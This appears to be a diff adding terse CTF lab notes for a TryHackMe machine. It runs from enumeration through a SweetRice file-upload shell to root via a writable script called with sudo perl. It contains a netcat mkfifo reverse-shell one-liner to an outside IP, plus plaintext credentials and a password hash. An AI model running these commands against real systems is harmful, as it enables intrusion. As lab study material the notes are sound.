@@ -1,0 +1,94 @@
+10.10.239.237
+
+Nmap -sC -sV -p- 
+
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+
+
+
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+Gobuster
+
+/
+	/content (Status: 301)
+	/server-status (Status: 403)
+		
+/content
+Sweetrice 
+changelog.txt - version 1.5.0
+https://www.exploit-db.com/exploits/40716
+
+	/images
+	Uploads folder
+	
+	/js (Status: 301)
+	some .php files are readable
+	
+	/inc (Status: 301)
+	mysql_bakup_20191129023059-1.5.1.sql
+	Further inspection found a username and password hash
+	manager:﻿Password123
+	
+	/as (Status: 301)
+		login page
+		manager:﻿Password123
+			﻿media centre tab
+			unable to upload php shell
+			edit file name in Burp .php3
+			uploaded
+				Shell
+			
+			Creds
+			    Database : mysql
+			    Database Host : localhost
+			    Database Port : 3306
+			    Database Account : rice
+			    Database Password : randompass
+			
+	/_themes (Status: 301)
+	
+	
+	/attachment (Status: 301)
+	Upload folder
+
+
+Shell - www-data
+
+user.txt
+	
+	
+
+sudo -l
+	User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+
+sudo perl -e 'exec "/bin/bash";'
+
+failed
+
+
+
+# cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+Echo shell into copy.sh
+                          
+www-data@THM-Chal:/home/itguy$ cat  /etc/copy.sh   
+ 
+ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.177.195 9999 >/tmp/f
+
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl 
+
+ROOT
+
+# cat root.txt                                                                                   
+
+
+
+
+
+itguy:$6$lEFmSzBi$M/BzAIH6sOmfmItrGxeLHdyrhb08KQyx8o0fDAytD2Xu9YKbZyYYqYXtnn0nnQrLRMed8GKJbvA.RwGM9HU3y0:18228:0:99999:7:::
